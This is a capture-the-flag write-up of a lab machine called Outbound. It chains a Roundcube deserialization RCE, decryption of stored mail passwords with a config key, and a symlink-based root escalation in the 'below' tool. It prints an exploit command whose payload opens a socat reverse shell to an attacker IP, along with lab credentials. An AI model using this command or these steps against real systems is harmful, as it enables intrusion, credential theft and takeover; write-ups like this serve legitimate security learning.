# Outbound CTF Writeup

Welcome to my writeup for the **Outbound** CTF! This was a fun and challenging box that required a mix of enumeration, exploitation, and privilege escalation. Let me walk you through my thought process and how I tackled each step.

---

## Initial Enumeration

Starting with `nmap`, I discovered two open ports: **80** (HTTP) and **22** (SSH). Navigating to the IP in my browser redirected me to a domain: `mail.outbound.htb`. The site presented a **Roundcube Webmail** interface. 

The subject gave me valid credentials: `tyler:LhKL1o9Nm3X2`. Logging in with these, I was disappointed to find the mailbox empty. However, the "About" page revealed the Roundcube version: **1.6.10**.

![Roundcube Version](sc/version.jpg)

---

## Exploiting Roundcube (CVE-2025-49113)

A quick search led me to a known RCE vulnerability for this version: [CVE-2025-49113](https://www.cve.org/CVERecord?id=CVE-2025-49113). The vulnerability, as explained in [this article](https://fearsoff.org/research/roundcube), leverages insecure deserialization to achieve remote code execution. Since I wasn’t confident in reproducing the exploit manually, I used the provided script from the article's [GitHub repository](https://github.com/fearsoff-org/CVE-2025-49113).

I executed the exploit with the following command:

```bash
php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.173:4444"
```

This gave me a foothold on the box.

![Foothold](sc/foothold.jpg)

---

## Database Exploration

Next, I searched for sensitive information in the Roundcube configuration files. I found the following database credentials:

```
mysql://roundcube:RCDBPass2025@localhost/roundcube
```

Inside the database, I discovered a table named `session` containing Base64-encoded data. Decoding it revealed a username (`jacob`) and an encrypted password.

![Database Session](sc/mariadb.jpg)

---

## Decrypting Jacob's Password

The Roundcube configuration also contained a decryption key:

```php
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

Using this key and the decryption function from the source code, I modified the function to make it usable. For example, I had to extract the `crypto_method` value from the code:

![Crypto Method](sc/crypto_method.jpg)

After running my modified script (`script/decrypt.php`), I successfully decrypted Jacob's mail password: `jacob:595mO8DmwGeD`.

![Encrypted Password](sc/encrypted.jpg)

---

## SSH Access as Jacob

Logging into Jacob's mailbox, I found an email containing another password. It seemed Jacob had ignored instructions to change it. Using `jacob:gY4Wr3a1evp4`, I gained SSH access to the machine. The user flag was waiting for me in Jacob's home directory.

![User Flag](sc/userflag.jpg)

---

## Privilege Escalation with Below

Running `sudo -l`, I saw that Jacob could execute the `below` binary with some restrictions:

```plaintext
User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

The binary was version **0.8.0**, which is vulnerable to a privilege escalation exploit ([GHSA-9mc5-7qhg-fp3w](https://github.com/advisories/GHSA-9mc5-7qhg-fp3w)). The exploit leverages the fact that the log directory is world-writable. By creating a symlink between the log file path and an arbitrary file (e.g., `/etc/passwd`), we can overwrite files as root.

---

## Exploiting Below

Before writing to the log file, the binary changes its permissions to `0666` as root. I created a symlink between the log file and `/etc/passwd`. Triggering the logging with `sudo below record` allowed me to overwrite `/etc/passwd` and remove the root password.

![Permissions](sc/perms.jpg)

Finally, I switched to the root user and grabbed the root flag from `/root/root.txt`.

![Root Flag](sc/root_flag.jpg)

---

## Conclusion

This box was a great learning experience. The initial foothold was straightforward, but the final privilege escalation required careful reading and experimentation. The lack of documentation for the `below` exploit added an extra layer of challenge, making the victory even sweeter. Thanks for reading!